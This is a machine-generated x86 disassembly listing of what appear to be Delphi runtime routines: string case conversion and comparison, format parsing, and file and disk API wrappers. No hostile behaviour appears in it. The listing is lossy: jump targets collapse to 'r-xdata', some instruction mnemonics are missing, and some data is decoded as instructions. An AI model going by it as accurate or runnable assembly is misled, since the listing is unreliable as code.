mov edx ebx
call sub_402fc4
mov eax esi
pop esi
pop ebx
retn
sub_4085bc
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_402764
call ebx
pop ebx
retn
sub_4085e8
push ebx
mov ebx eax
mov eax 0xc
call sub_402744
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_4085bc
pop ebx
retn
sub_408620
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4046e4
mov ebx eax
mov eax edi
mov edx ebx
call sub_404a68
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_40865c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4046e4
mov ebx eax
mov eax edi
mov edx ebx
call sub_404a68
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_408698
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_4086c8
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
shr ecx 0x1
shr ecx 0x1
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
inc eax
sub_4086e8
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_40873c
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_4086e8
test eax eax
jne r-xdata
sub_408760
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4046e4
mov ebx eax
mov eax esi
call sub_4048dc
mov edx eax
mov eax edi
mov ecx ebx
call sub_40451c
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_408794
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4046e4
mov ebx eax
mov eax esi
call sub_4048dc
mov edx eax
mov eax edi
mov ecx ebx
call sub_40451c
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_4087c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4046e4
push eax
mov eax esi
call sub_4048dc
push eax
mov eax ebx
call sub_4046e4
push eax
mov eax ebx
call sub_4048dc
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408800
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4046e4
push eax
mov eax esi
call sub_4048dc
push eax
mov eax ebx
call sub_4046e4
push eax
mov eax ebx
call sub_4048dc
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408850
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_408870
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_4046e4
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_40442c
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_40493c
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4088c0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov edi eax
xor eax eax
push ebp
push sub_408a19
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx edi
mov eax edi
call sub_4046e4
mov esi eax
add esi ebx
mov eax edi
call sub_4046e4
mov [ ebp - 0xc ] eax
cmp esi ebx
jbe r-xdata
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_40461c
mov eax [ ebp - 0x14 ]
call sub_4046e4
cmp eax [ ebp - 0xc ]
jne r-xdata
mov al [ ebx ]
mov edx eax
sub dl 0xa
je r-xdata
mov ebx edi
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
xor edx edx
call sub_40451c
mov edi [ ebp - 0x8 ]
mov edi [ edi ]
cmp esi ebx
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov edx edi
call sub_404480
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
sub dl 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_408a20
lea eax [ ebp - 0x14 ]
call sub_40442c
retn
mov al [ ebx ]
mov edx eax
sub dl 0xa
je r-xdata
inc ebx
inc [ ebp - 0xc ]
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
sub dl 0x3
je r-xdata
cmp [ ebx + 0x1 ] 0xa
jne r-xdata
cmp [ ebx + 0x1 ] 0xa
jne r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov [ edi ] 0xa
inc edi
inc ebx
jmp r-xdata
mov [ edi ] 0xd
inc edi
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
jmp r-xdata
dec [ ebp - 0xc ]
jmp r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
inc ebx
jmp r-xdata
mov eax ebx
call sub_40ca4c
mov ebx eax
jmp r-xdata
cmp esi ebx
ja r-xdata
mov [ edi ] 0xa
inc edi
inc ebx
cmp [ ebx ] 0xa
jne r-xdata
mov [ edi ] 0xd
inc edi
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
cmp esi ebx
ja r-xdata
inc ebx
jmp r-xdata
mov al [ ebx ]
mov [ edi ] al
inc edi
inc ebx
mov eax ebx
call sub_40ca2c
mov [ ebp - 0x10 ] eax
mov edx edi
mov eax ebx
mov ecx [ ebp - 0x10 ]
call sub_4028fc
add edi [ ebp - 0x10 ]
add ebx [ ebp - 0x10 ]
jmp r-xdata
sub_408a28
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4046e4
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_4046e4
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_408abc
push ebp
mov ebp esp
add esp 0xfffffff8
push 0x0
lea edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] 0x10
lea ecx [ ebp - 0x8 ]
mov edx r-xdata
call sub_409744
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408af0
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402fe4
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_408578
sub_408b44
push ebx
add esp 0xffffffec
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_4055b4
mov [ esp ] eax
mov [ esp + 0x4 ] edx
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x14
pop ebx
retn
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] 0xb
lea edx [ esp + 0xc ]
mov eax [ rw-data ]
xor ecx ecx
call sub_408578
sub_408ba4
push cs
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
sete al
add esp 0x400
pop esi
pop ebx
retn
popad
je r-xdata
inc eax
add al ch
sar edi 0xff
xor eax eax
push ebp
push sub_408c62
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x4 ]
call sub_40442c
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405ff4
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404480
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_408c69
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404ed8
retn
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
add al 0x0
add [ eax ] al
mov eax eax
push ebx
push esi
add esp 0xfffffc00
mov esi eax
mov ebx edx
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
call LoadStringA
mov ecx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_40451c
cmp [ ebx + 0x4 ] 0x0
sub_408bfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404e08
xor eax eax
push ebp
push sub_408c62
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x4 ]
call sub_40442c
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405ff4
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404480
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_408c69
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404ed8
retn
sub_408c84
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
shr edx 0x4
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_4048dc
push eax
call CreateFileA
sub_408ce0
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_4048dc
push eax
call CreateFileA
pop ebx
retn
sub_408d0c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408d38
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408d64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408da4
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_4048dc
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_408e1c
push ebx
push esi
mov esi eax
mov eax esi
call sub_4046e4
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c81c
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408e4c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_4046e4
mov edi eax
mov eax ebx
call sub_4048dc
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_409140
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c81c
cmp al 0x2
jne r-xdata
dec edi
sub_408e9c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408e4c
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_40493c
pop edi
pop esi
pop ebx
retn
sub_408ed4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_408e4c
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_40442c
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_40493c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_408f13
inc [ ebx ]
add [ eax ] al
add [ esi ] ch
pop esp
cmp al [ eax ]
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_4053bc
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_4053bc
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408fcc
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408ff4
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ edi - 0x1 ]
pop esi
pop edi
retn
sub_409020
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_409054
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_4046e4
push eax
mov eax ebx
call sub_4048dc
mov edx eax
mov eax esi
pop ecx
call sub_409020
pop esi
pop ebx
retn
sub_409078
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4048dc
mov edx eax
mov ecx edi
mov eax ebx
call sub_409020
pop edi
pop esi
pop ebx
retn
sub_409098
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_4090bc
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4090fc
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_409140
push edi
push eax
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
pop edi
mov al dl
[ edi ]
mov eax 0x0
jne r-xdata
pop edi
retn
mov eax edi
dec eax
sub_409160
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_4091e8
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408f90
mov esi eax
inc esi
mov eax esi
call sub_4091c8
mov ecx esi
mov edx ebx
call sub_408fbc
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_409224
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c840
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408fbc
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_408578
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_40929c
push ebp
mov ebp esp
add esp 0xffffff8c
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_409690
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_40937e
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_4093c6
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_40937e
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_409290
pop edx
or edx edx
je r-xdata
sub_40937e
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
ja r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_409690
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4093c6
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
ja r-xdata
call sub_409690
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_409224
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_4093ed ]
test [ ebx + 0x4 ] 0x80000000
je sub_409489
cmp cl 0x55
je sub_409489
xor eax eax
lea ebx [ ebp - 0x30 ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
cmp cl 0x44
je r-xdata
cmp cl 0x44
je r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_40464c
jmp r-xdata
mov esi sub_4046ac
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
neg [ ebx ]
adc [ ebx + 0x4 ] 0x0
neg [ ebx + 0x4 ]
call sub_409489
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
cmp cl 0x58
jne r-xdata
or eax eax
jns sub_40951a
cmp cl 0x55
je sub_40951a
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov [ ebp - 0x24 ] 0x8
mov ecx 0x10
jmp r-xdata
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0x10
jmp r-xdata
neg eax
call sub_40951a
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
cmp cl 0x58
jne r-xdata
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40927c
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
lea esi [ ebp - 0x61 ]
push ebx
push eax
push edx
lea eax [ ebp - 0x71 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_409848
mov ecx eax
lea esi [ ebp - 0x71 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
lea esi [ ebp - 0x51 ]
mov ecx 0x10
jmp r-xdata
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
dec esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
dec esi
mov [ esi ] dl
push ebx
push ecx
push 0x0
push ecx
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
mov ebx [ ebp - 0x4 ]
call sub_40545c
pop ecx
pop ebx
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
or eax edx
jne r-xdata
add dl 0x7
xor edx edx
div ecx
add dl 0x30
cmp dl 0x3a
jb r-xdata
lea ecx [ ebp - 0x61 ]
sub ecx esi
mov edx [ ebp - 0x24 ]
cmp edx 0x10
jbe r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
push ebx
push ecx
push 0x0
push ecx
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
mov ebx [ ebp - 0x4 ]
call sub_405524
pop ecx
pop ebx
xchg edx eax
add dl 0x30
cmp dl 0x3a
jb r-xdata
lea ecx [ ebp - 0x51 ]
sub ecx esi
mov edx [ ebp - 0x24 ]
cmp edx 0x10
jbe r-xdata
sub edx ecx
jbe r-xdata
retn
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub edx ecx
jbe r-xdata
retn
retn
add ecx edx
mov al 0x30
retn
add ecx edx
mov al 0x30
dec esi
mov [ esi ] al
dec edx
jne r-xdata
dec esi
mov [ esi ] al
dec edx
jne r-xdata
sub_409489
mov ecx 0xa
lea esi [ ebp - 0x51 ]
dec esi
mov [ esi ] dl
push ebx
push ecx
push 0x0
push ecx
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
mov ebx [ ebp - 0x4 ]
call sub_40545c
pop ecx
pop ebx
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
or eax edx
jne r-xdata
add dl 0x7
push ebx
push ecx
